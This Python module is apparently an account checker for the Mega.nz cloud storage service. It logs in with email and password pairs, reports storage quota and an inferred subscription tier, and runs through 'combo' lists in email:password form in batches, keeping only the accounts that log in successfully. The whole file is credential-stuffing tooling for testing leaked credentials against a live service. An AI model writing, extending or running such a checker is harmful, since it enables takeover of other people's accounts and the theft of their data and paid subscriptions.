"""
Mega.nz Checker Module
---------------------
Active validation of Mega.nz credentials.
Checks for:
- Valid Login
- Subscription Status (Free/Pro)
- Storage Quota/Usage
"""

import time
from typing import Dict, Any, Optional
from loguru import logger
from mega import Mega

class MegaChecker:
    """Active checker for Mega.nz accounts."""
    
    def __init__(self):
        self.mega = Mega()
        
    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        """
        Validate a Mega.nz account.
        Returns dict with status and details.
        """
        try:
            # Login
            m = self.mega.login(email, password)
            
            # Get Account Details
            # get_user() returns a User object or dict
            user_details = m.get_user()
            quota = m.get_storage_space(giga=True) # Returns dict {used, total}
            
            # Determine Plan
            # This is a bit heuristic as mega.py might not expose succinct plan name directly
            # We infer from storage size usually or 'type' field if available
            total_gb = quota.get('total', 0)
            plan = "Free"
            if total_gb > 20: # 20GB is standard free (sometimes 50)
                plan = "Premium/Bonus"
            if total_gb >= 400:
                plan = "Pro Lite"
            if total_gb >= 2000:
                plan = "Pro I"
                
            return {
                "valid": True,
                "email": email,
                "plan": plan,
                "storage_used_gb": round(quota.get('used', 0), 2),
                "storage_total_gb": round(total_gb, 2),
                "files_count": 0 # Difficult to get cheap
            }
            
        except Exception as e:
            # e.g. 9 (Resource does not exist) usually means bad login
            error_msg = str(e)
            if "9" in error_msg or "13" in error_msg: # API Error Codes
                return {"valid": False, "reason": "Invalid Credentials"}
            
            logger.warning(f"Mega check error for {email}: {e}")
            return {"valid": False, "reason": "Error/RateLimit"}

    def check_batch(self, combos: list) -> list:
        """Check a batch of combos sequentially (simple version)."""
        results = []
        for combo in combos:
            if ':' not in combo: continue
            user, pwd = combo.split(':', 1)
            res = self.check_account(user, pwd)
            if res['valid']:
                results.append(res)
            # Rate limit respect
            time.sleep(2) 
        return results
